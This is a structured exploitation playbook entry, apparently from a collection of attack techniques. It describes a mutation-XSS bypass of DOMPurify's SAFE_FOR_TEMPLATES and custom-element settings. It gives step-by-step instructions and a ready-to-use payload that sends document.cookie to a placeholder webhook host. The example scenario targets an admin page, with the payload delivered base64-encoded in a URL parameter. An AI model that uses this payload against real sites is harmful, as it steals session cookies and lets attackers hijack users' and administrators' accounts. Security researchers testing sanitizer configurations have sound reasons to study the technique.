---
name: dompurify_mxss_custom_element_safe_for_templates
vuln_type: xss
sub_technique: mxss_dom_clobbering
category: exploitation
safety_level: safe
tags:
- xss
- mxss
- dompurify
- custom-element
- mutation-xss
- sanitizer-bypass
---

# Dompurify Mxss Bypass Via Custom Elements + Safe For Templates Config

## When to Apply

DOMPurify is configured with SAFE_FOR_TEMPLATES: true and CUSTOM_ELEMENT_HANDLING (tagNameCheck: /^custom-/). When sanitized HTML is assigned to innerHTML, DOM mutation can cause event handlers to survive.

## Prerequisites

- DOMPurify with SAFE_FOR_TEMPLATES: true
- CUSTOM_ELEMENT_HANDLING with tagNameCheck for custom- prefix
- Sanitize output is assigned to innerHTML
- CSP allows inline script/event handlers (unsafe-inline, etc.)

## Steps

1. Check DOMPurify config: `SAFE_FOR_TEMPLATES`, `CUSTOM_ELEMENT_HANDLING`
2. Construct mutation XSS payload: combine `<math>`, `<table>`, `<custom-*>` tags to induce structural changes during DOM parsing
3. Use template syntax like `<! \${` inside `<style>` tag to confuse the parser
4. Insert event handler inside attribute via `<custom-b id=">...">` form
5. After sanitize, innerHTML assignment triggers DOM reparse → `<img onerror=...>` activates
6. XSS fires: `location.href='...' + document.cookie`

## Code Template

```
<math><custom-test><mi><li><table><custom-test><li></li></custom-test><a><style><! \${</style>}<custom-b id="><img src onerror='location.href=`{webhook}/?token=`+document.cookie'>">test</custom-b></a></table></li></mi></custom-test></math>
```

## Examples

### Example 1

- **dompurify_config**: SAFE_FOR_TEMPLATES: true, CUSTOM_ELEMENT_HANDLING: {tagNameCheck: /^custom-/}
- **sink**: innerHTML assignment in admin page
- **delivery**: base64 encoded in URL query parameter

When DOMPurify's SAFE_FOR_TEMPLATES mode allows custom elements, mutation XSS is possible by combining math/table context switching with style tags. When server-side sanitized HTML is re-parsed via innerHTML on the client, the DOM structure changes and event handlers become active.
